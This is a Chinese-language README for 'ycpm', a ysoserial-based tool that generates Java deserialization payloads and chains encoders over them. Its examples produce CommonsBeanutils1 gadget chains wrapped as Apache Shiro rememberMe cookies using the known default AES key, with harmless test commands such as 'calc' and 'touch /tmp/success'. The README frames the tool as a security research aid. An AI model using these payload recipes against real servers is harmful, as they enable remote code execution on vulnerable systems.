# 🌐 ycpm - Ysoserial Chain Process Model

**ycpm** 是一个用于构建和处理 Java 反序列化利用链的工具，支持动态编码、多级编排。  
它基于 [ysoserial](https://github.com/frohoff/ysoserial) 构建，本项目仅用于 Java 安全研究与学习目的，旨在帮助安全研究人员、开发者简单构建安全测试用的反序列化payload。

请勿将本项目中的任何代码或技术用于未授权的测试、攻击、渗透等任何非法用途。

---

## ✨ 功能特性

- ✅ 兼容 ysoserial 的 payload 构造逻辑
- 🔗 支持 encoder 链：base64、bcel、shiro 等组合

---

## 🚀 使用示例

### 1️⃣ 标准 ysoserial 利用链

```bash
java -jar ycpm.jar "CommonsBeanutils1" "calc"
```
等价于：java -jar ysoserial.jar "CommonsBeanutils1" "calc"

### 2️⃣ 构造并进行链式编码

```bash
# 在标准ysoserial的基础上使用base64编码并通过终端输出
java -jar ycpm.jar "CommonsBeanutils1" "calc" "base64->print"

# 使用base64编码并输出到exploit.ser文件
java -jar ycpm.jar "CommonsBeanutils1" "calc" "base64->file:exploit.ser"

# 使用shiro encoder并指定加密用的key，将结果通过终端输出
java -jar ycpm.jar "CommonsBeanutils1" "calc" "shiro:kPH+bIxk5D2deZiIxcaaaA==->print"

# 使用shiro encoder，使用默认key(kPH+bIxk5D2deZiIxcaaaA==)，并将结果进行url编码输出到终端
java -jar ycpm.jar "CommonsBeanutils1" "calc" "shiro->url->print"

# 在此基础上你还可以多次调用编码器，就像这样：
java -jar ycpm.jar "CommonsBeanutils1" "calc" "shiro->url->url->print"
```

## 🧩 Encoder 编码器

本模块实现了一个 **可插拔、可链式组合的编码器框架**，支持多种常见编码方式，适用于反序列化、加密流构造、Payload 编码等场景。各个编码器均支持通过注解注册及自动扫描方式进行加载，可自由组合调用，形成链式调用流程。

如果链条的末尾未使用`file`、`print`的话，则会默认在链条的结尾调用`print`

### ✅ 当前支持的编码器列表

| 编码器名称 | 描述                                                | 输入类型                           | 输出类型         | 示例                                       |
|------------|---------------------------------------------------|--------------------------------|--------------|------------------------------------------|
| `base64`   | 标准 Base64 编码                                      | `Object` / `byte[]` / `String` | `String`     | `base64`                                 
| `shiro`    | Shiro AES 加密 + Base64 编码（用于构造 rememberMe payload） | `Object` / `byte[]`            | `String`     | `shiro`、`shiro:kPH+bIxk5D2deZiIxcaaaA==` |
| `BCEL`     | BCEL 编码器，用于将类字节码转为 `$$BCEL$$` 编码格式                | `Object` / `byte[]`                       | `String`     | `bcel`                                   |
| `URL`      | URL 编码                                            | `String`                       | `String`     | `url`                                    |
| `File`     | 将内容输出到文件                                          | `String`（文件路径）                 | `Boolean`    | `file`、`file:exploit.ser`                |
| `Print`    | 默认使用System.out输出内容                                | 任意                             | `System.out` | `print`                                  |

> 💡 编码器均支持链式组合，例如：Chain -> BCEL 编码 -> Base64 编码。

### 🔗 编码器链式调用示例

```bash
# 生成shiro的默认密钥攻击payload，并打印在终端，下边这两条命令是相等的
java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro"
java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro->print"

# 生成shiro指定密钥攻击payload，并打印在终端，下边这两条命令是相等的
java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro:kPH+bIxk5D2deZiIxcaaaA=="
java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro:kPH+bIxk5D2deZiIxcaaaA==->print"

# 生成shiro指定密钥攻击payload，并将结果输出到exploit.ser文件
java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro->file:exploit.ser"

# 在此基础上你还可以多次调用编码器，就像这样：
java -jar ycpm.jar "CommonsBeanutils1" "touch /tmp/success" "shiro:kPH+bIxk5D2deZiIxcaaaA==->url->print"
```

## 🙏 致谢

该项目参考了以下相关内容，在此表示感谢！

- [frohoff/ysoserial](https://github.com/frohoff/ysoserial)